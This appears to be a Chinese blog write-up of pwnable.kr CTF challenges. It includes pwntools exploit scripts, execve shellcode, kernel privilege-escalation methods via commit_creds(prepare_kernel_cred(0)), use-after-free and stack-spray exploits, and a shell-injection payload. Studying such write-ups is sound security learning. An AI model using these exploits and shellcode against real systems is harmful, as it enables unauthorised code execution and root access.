<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">a=process(<span class="string">&quot;/home/fix/fix&quot;</span>)</span><br><span class="line">a.recv()</span><br><span class="line">a.sendline(<span class="string">&#x27;15&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">&#x27;201&#x27;</span>)</span><br><span class="line">a.recvuntil(<span class="string">&quot;get shell\n&quot;</span>)</span><br><span class="line">error=a.recvline()</span><br><span class="line"><span class="comment">#print(error)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = error.find(<span class="string">&#x27;open &#x27;</span>)</span><br><span class="line">fname = error[m+<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">f = <span class="built_in">open</span>(fname,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&#x27;sh\n&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">a=process(<span class="string">&quot;/home/fix/fix&quot;</span>)</span><br><span class="line">a.recv()</span><br><span class="line">a.sendline(<span class="string">&#x27;15&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">&#x27;201&#x27;</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>由于内核系统调用未限制可访问的内存地址引起的内核漏洞，利用思路：</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>手撸汇编，汇编出commit_creds(prepare_kernel_cred(0)) 的不包含小写字母的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data:00000008 b501 push &#123;r0, lr&#125;	      </span><br><span class="line">.data:0000000a 1a92 subs r2, r2, r2	      </span><br><span class="line">.data:0000000c 1c10 adds r0, r2, #0	      </span><br><span class="line">.data:0000000e 46f0 mov r8, lr	      </span><br><span class="line">.data:00000010 4a02 ldr r2, [pc, #8] ; (0x0000001c)	;char c &#x3D; src[i]</span><br><span class="line">.data:00000012 4790 blx r2	      </span><br><span class="line">.data:00000014 4a02 ldr r2, [pc, #8] ; (0x00000020)	;dst[i] &#x3D; c</span><br><span class="line">.data:00000016 321c adds r2, #28	      </span><br><span class="line">.data:00000018 4790 blx r2	;i++</span><br><span class="line">.data:0000001a bd01 pop &#123;r0, pc&#125;	</span><br><span class="line">      </span><br><span class="line">.data:0000001c 8003f924 #cat &#x2F;proc&#x2F;kallsyms|grep commit_creds</span><br><span class="line">.data:00000020 8003f550 #cat &#x2F;proc&#x2F;kallsyms|grep prepare_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到对应的字节码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> grant_privs[] = <span class="string">&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a&quot;</span></span><br><span class="line">                     <span class="string">&quot;\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32&quot;</span></span><br><span class="line">                     <span class="string">&quot;\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">#/proc $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h |grep 343</span></span><br><span class="line"><span class="comment">#define __NR_vmsplice                   (__NR_SYSCALL_BASE+343)</span></span><br><span class="line">   </span><br><span class="line">   void * sys_vmsplice = (void *)<span class="number">0x800e3dc8</span>;<span class="comment">#343系统调用对应的函数SyS_vmsplice</span></span><br><span class="line">   syscall(<span class="number">223</span>, grant_privs, sys_vmsplice);</span><br><span class="line">   syscall(<span class="number">343</span>);</span><br><span class="line">...</span><br><span class="line">   code to cat falg </span><br></pre></td></tr></table></figure>
<h4 id="方法二-修改SYS-CALL-TABLE"><a href="#方法二-修改SYS-CALL-TABLE" class="headerlink" title="方法二 修改SYS_CALL_TABLE"></a>方法二 修改SYS_CALL_TABLE</h4><p>由于最终要执行commit_creds(prepare_kernel_cred(0));函数</p>
<p>我们可以修改两个系统调用表分别指向commit_creds 函数和prepare_kernel_cred函数</p>
<p>查找系统调用表后，选取系统调用号未stime() 系统调用号为 time()进行替换(ps:选取这两个系统调用是因为这两个系统调用参数刚好都是一个)</p>
<p>这样调用syscall(25(syscall(13,0))就相当于调用了commit_creds(prepare_kernel_cred(0));</p>
<h4 id="方法三-自设syscall"><a href="#方法三-自设syscall" class="headerlink" title="方法三 自设syscall"></a>方法三 自设syscall</h4><ul>
<li>Prepare a syscall routine <code>sys_getroot</code></li>
</ul>
<p>实现commit_creds(prepare_kernel_cred(0));功能</p>
<ul>
<li>Overwrite <code>sys_upper</code> at <code>&amp;SYS_CALL_TABLE[SYS_upper]</code> to <code>sys_getroot</code> with syscall <code>SYS_upper</code></li>
</ul>
<p>修改SYS_CALL_TABLE</p>
<ul>
<li>Call <code>SYS_upper</code> again with addresses of <code>prepare_kernel_cred</code> and <code>commit_creds</code>.</li>
</ul>
<p>调用SYS_upper</p>
<h3 id="crypton1"><a href="#crypton1" class="headerlink" title="crypton1"></a>crypton1</h3><p>非常有意思的密码题</p>
<p>用户输入 ID + PW</p>
<p>服务器返回采用CBC模式加密的AES(ID_PW_cookie)加密hexdigest结果 ，PW=sha256(ID+COOKIE).hexdigest</p>
<p>用户得到root的PW即可顺利getshell，思路非常清晰关键就是如何获取COOKIE。</p>
<p>AES的CBC模式以16字节(128bit)为一组进行加密</p>
<p><img src="http://fireworkxzww.top//pic/image-20220125010636073.png" alt="image-20220125010636073" style="zoom:67%;" /></p>
<p><img src="http://fireworkxzww.top//pic/image-20220125012111211.png" alt="image-20220125012111211" style="zoom:67%;" /></p>
<h3 id="echo1"><a href="#echo1" class="headerlink" title="echo1"></a>echo1</h3><p>存在固定的某个可写入内容的地址id，写入Jmp rsp</p>
<p>Ez ROP Jmp rsp</p>
<h3 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h3><ul>
<li><p>23字节的一个shellcode</p>
</li>
<li><p>fsb泄露栈地址</p>
</li>
<li><p>UAF : 选4会free掉指向函数的指针0x28，选3会申请并释放一个大小为0x20的指针。如果我们free指针o，3中会申请到刚free的函数指针o，覆写第四个函数指针指向23字节的shellcode，这样退出的时候就执行了shellcode</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode &#x3D; &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;# 23 bytes</span><br></pre></td></tr></table></figure>
<p><img src="http://fireworkxzww.top//pic/image-20220125043012894.png" alt="image-20220125043012894"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9011</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><span class="comment"># 23 bytes</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27; : &#x27;</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#获取ebp</span></span><br><span class="line">rbp_addr = <span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(hex(rbp_addr))</span></span><br><span class="line">shellcode_addr = rbp_addr-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;(y/n)&#x27;</span>)</span><br><span class="line"><span class="comment">#UAF</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="rsa-calculator"><a href="#rsa-calculator" class="headerlink" title="rsa_calculator"></a>rsa_calculator</h3><p>基本思路</p>
<ul>
<li>RSA set key过程中参数校验有问题，应该为||不符合一个就报错</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220126094608451.png" alt="image-20220126094608451"></p>
<ul>
<li>fsb 泄露canary</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220126083737269.png" alt="image-20220126083737269"></p>
<p><img src="http://fireworkxzww.top//pic/image-20220126092301763.png" alt="image-20220126092301763"></p>
<p>输入%p.%p.%p.%p.%p.%p.%p.%p测栈顶在第几个参数</p>
<p><img src="http://fireworkxzww.top//pic/image-20220126092357650.png" alt="image-20220126092357650"></p>
<p>可以看到rsi为第一个参数,栈顶为第6个参数，结合ebp地址我们可以计算出</p>
<p>ebp是第<script type="math/tex">(6+(0x7fffffffdfa0-0x7fffffffd960)/8)</script>=206个参数，那么canary就是205个参数这样就泄露出canary</p>
<ul>
<li><p>decrypt()过程存在溢出</p>
</li>
<li><p>pri_addr = 0x602960</p>
<p>g_pbuf= 0x602560</p>
<p><img src="http://fireworkxzww.top//pic/image-20220126083717709.png" alt="image-20220126083717709"></p>
<p>无界复制可导致g_pbuf溢出覆盖pri_addr</p>
</li>
</ul>
<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>EZ   stack  spray: <em>spray</em> the <em>stack</em> with your shellcode address</p>
<p>Tips:</p>
<ul>
<li>菜单循环用的是递归，每次调用函数栈帧大小是固定的0x430</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220127040400192.png" alt="image-20220127040400192"></p>
<p><img src="http://fireworkxzww.top//pic/image-20220127040433219.png" alt="image-20220127040433219"></p>
<p>hex(0xffffc8b0-0xffffcce0)=-0x430</p>
<ul>
<li>mmap_s函数增加了类似于ASLR的功能返回一个随机的地址，但是看源码得到:用于存储note的page分配的是RWX页权限，猜测这个页面是可以放shellcode的部分，然后利用程序漏洞跳转到该shellcode</li>
</ul>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ptr = mmap_s((<span class="keyword">void</span>*)<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">mmap_s</span><span class="params">(<span class="keyword">void</span>* addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// security fix: current version of mmap(NULL.. is not giving secure random address</span></span><br><span class="line">	<span class="keyword">if</span>(addr == <span class="literal">NULL</span> &amp;&amp; !(flags &amp; MAP_FIXED) )&#123;</span><br><span class="line">		<span class="keyword">void</span>* tmp=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">if</span>(read(fd, &amp;addr, <span class="number">4</span>)!=<span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="comment">// to avoid heap fragmentation, lets skip malloc area</span></span><br><span class="line">		addr = (<span class="keyword">void</span>*)( ((<span class="keyword">int</span>)addr &amp; <span class="number">0xFFFFF000</span>) | <span class="number">0x80000000</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="comment">// linearly search empty page (maybe this can be improved)</span></span><br><span class="line">			tmp = mmap(addr, length, prot, flags | MAP_FIXED, fd, offset);</span><br><span class="line">			<span class="keyword">if</span>(tmp != MAP_FAILED)&#123;</span><br><span class="line">				<span class="keyword">return</span> tmp;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="comment">// memory already in use!</span></span><br><span class="line">				addr = (<span class="keyword">void</span>*)((<span class="keyword">int</span>)addr + PAGE_SIZE);	<span class="comment">// choose adjacent page</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>man  mmap查一下各个参数发现MAP_FIXED存在问题</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220127232627401.png" alt="image-20220127232627401"></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/14943990/overlapping-pages-with-mmap-map-fixed">Stackoverflow</a>这篇已经讲的非常清楚。</p>
<p>很精髓的一句话：</p>
<blockquote>
<p>I think using “MAP_FIXED” is one of those things where “here, have this gun, but please be careful you don’t shoot yourself in the foot”. In other words, “it’s your task to ensure you use it correctly”.</p>
</blockquote>
<p>源程序使用这个参数的目的是为了防止由于页面置换导致的mmap失败，但其实如果addr所在的页面存在，新的页面会替换掉原来的页面，这就导致了我们可以实现任意地址写(但是随机的)</p>
<ul>
<li>可以利用页面替换将栈上数据填满shellcode addr这样return的时候会返回到可执行的shellcode页面</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = logging.DEBUG</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">p = process(e.path)</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9001</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"></span><br><span class="line">select_cnt = <span class="number">0</span>         <span class="comment">#regard stack frame layer</span></span><br><span class="line">esp_start =  *******   <span class="comment">#This may be different in different os,but it does matters,read the code and you know why.</span></span><br><span class="line">offset = 0x***         <span class="comment">#This is certain.Check it out with you GDB.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>():</span></span><br><span class="line">    <span class="keyword">global</span> select_cnt   <span class="comment"># in order to modify the variable</span></span><br><span class="line">    select_cnt += <span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note created. no &#x27;</span>)</span><br><span class="line">    no = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">b&#x27;\n&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    ptr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;]&#x27;</span>).strip(<span class="string">b&#x27;]&#x27;</span>), <span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> (no, ptr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">no</span>):</span></span><br><span class="line">    <span class="keyword">global</span> select_cnt   <span class="comment"># in order to modify the variable</span></span><br><span class="line">    select_cnt += <span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;note no?\n&#x27;</span>, <span class="built_in">str</span>(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">no, content</span>):</span></span><br><span class="line">    <span class="keyword">global</span> select_cnt   <span class="comment"># in order to modify the variable</span></span><br><span class="line">    select_cnt += <span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;note no?\n&#x27;</span>, <span class="built_in">str</span>(no))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(MAX : 4096 byte)&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bye</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    no, addr = create()</span><br><span class="line">    cur_esp = esp_start - offset * select_cnt</span><br><span class="line">    <span class="keyword">if</span> addr &lt; cur_esp:</span><br><span class="line">        delete(no)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">shellcode_no, shellcode_addr = create()</span><br><span class="line"></span><br><span class="line">write(shellcode_no, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#write your shellcode address here.</span></span><br><span class="line"></span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#This exp is instability for the reason that some important page may be overlapped.If it doest work,try it again :)</span></span><br></pre></td></tr></table></figure>
<p><img src="http://fireworkxzww.top//pic/image-20220124061814371.png" alt="image-20220124061814371"></p>
<h3 id="alloca-c"><a href="#alloca-c" class="headerlink" title="alloca.c"></a>alloca.c</h3><p>contral esp,control eip,control the world.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vuln:  alllca</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>use this code to rewrite esp,then control eip, get shell.</p>
<p>自己想wp的时候，把重点放在了这里$memcpy(buffer+size, \&amp;g_canary, 4);$但是分析后发现g_canary被写入了栈上某个固定的地址。</p>
<p><img src="http://fireworkxzww.top//pic/image-20220129062952862.png" alt="image-20220129062952862" style="zoom:67%;" /></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048745          mov     eax, ds:size    ; alloca here</span><br><span class="line">.text:0804874A          add     eax, 4           ;eax&#x3D;size+4</span><br><span class="line">.text:0804874D          lea     edx, [eax+0Fh]  ;edx&#x3D;size+4+0xf</span><br><span class="line">.text:08048750          mov     eax, 10h        </span><br><span class="line">.text:08048755          sub     eax, 1           ;eax&#x3D;0xf</span><br><span class="line">.text:08048758          add     eax, edx         ;eax&#x3D;size+4+0xf+0xf</span><br><span class="line">.text:0804875A          mov     ecx, 10h ; 除数</span><br><span class="line">.text:0804875F          mov     edx, 0  ;被除数高位,低位为eax</span><br><span class="line">.text:08048764          div     ecx     ;eax为商,edx为余数  &#x2F;&#x2F;等价于eax&#x3D;eax&#x2F;0x10</span><br><span class="line">.text:08048766          imul    eax, 10h;eax&#x3D;eax*0x10   &#x2F;&#x2F;结合上条功能为栈对齐</span><br><span class="line">.text:08048769          sub     esp, eax &#x2F;&#x2F;由于esp&#x3D;esp-eax 上条为栈向上对齐(注意区分esp&amp;0xfff0这个为向下对齐)</span><br><span class="line">.text:0804876B          mov     eax, esp</span><br><span class="line">.text:0804876D          add     eax, 0Fh ;由于栈已对齐junk code</span><br><span class="line">.text:08048770          shr     eax, 4   ;同上</span><br><span class="line">.text:08048773          shl     eax, 4   ;同上</span><br><span class="line">.text:08048776          mov     ds:buffer, eax;buffer&#x3D;esp-size-34</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">memcpy时,g_canary被放到esp-size-34+size&#x3D;esp-34的地址，无法改变main函数栈帧</span><br></pre></td></tr></table></figure>
<p>查看check_canary函数还有canary压栈的操作，汇编分析计算偏移即可</p>
<p>同类型练手</p>
<p>Seccon CTF quals 2016</p>
<h3 id="loveletter"><a href="#loveletter" class="headerlink" title="loveletter"></a>loveletter</h3><p><img src="http://fireworkxzww.top//pic/image-20220129203625461.png" alt="image-20220129203625461"></p>
<p><img src="http://fireworkxzww.top//pic/image-20220129203647834.png" alt="image-20220129203647834"></p>
<p>程序基本流程:读入用户输入，参数过滤后将敏感字节转换为♥(三字节b’\xe2\x99\xa5)，然后输出，但是最后调用的是字符串拼接echo $str 放入system参数。参数过滤会导致buf溢出，进而修改关键变量实现shell</p>
<p><img src="http://fireworkxzww.top//pic/image-20220129205607496.png" alt="image-20220129205607496"></p>
<p><strong>basic exp</strong></p>
<p>just get flag 因为过滤了’/‘所以可以直接通过溢出调system(“cat flag”)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./loveletter&quot;</span>)</span><br><span class="line">p = process(e.path)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;cat flag&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27; &#x27;</span>* <span class="comment">#payload need to cover v6 to 0.</span></span><br><span class="line">payload+=<span class="string">b&#x27;#&#x27;</span>  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>pro exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./loveletter&quot;</span>)</span><br><span class="line">p = process(e.path)</span><br><span class="line"></span><br><span class="line">lover = <span class="string">b&#x27;nv sh -c sh &#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;;\x01&#x27;</span></span><br><span class="line">padding =    <span class="comment">#payload need to cover v6 to 1.</span></span><br><span class="line">payload = lover + padding + payload</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>explanation about  system(“env sh -c sh junkstring”).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">If env is run without any options, it prints the variables of the current environment. Otherwise, env sets each NAME to VALUE and executes COMMAND.</span><br><span class="line"></span><br><span class="line">Demo:</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env command</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env -[v]S[option]… [name&#x3D;value]… command [args]…</span><br><span class="line"></span><br><span class="line">env sh -c &#39;exec &quot;$@&quot;&#39; sh prog&#x3D; true # also runs &#39;prog&#x3D;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">explanation:</span><br><span class="line"></span><br><span class="line">env sh  &#x3D;  -c sh  &#x2F;&#x2F; junkstring this part is regarded as argv of command.   </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>读一下env源码和man <a target="_blank" rel="noopener" href="https://www.gnu.org/software/coreutils/manual/html_node/env-invocation.html#env-invocation">page</a></p>
<p>撒花完结</p>
<p><img src="http://fireworkxzww.top//pic/image-20220129064213612.png" alt="image-20220129064213612"></p>
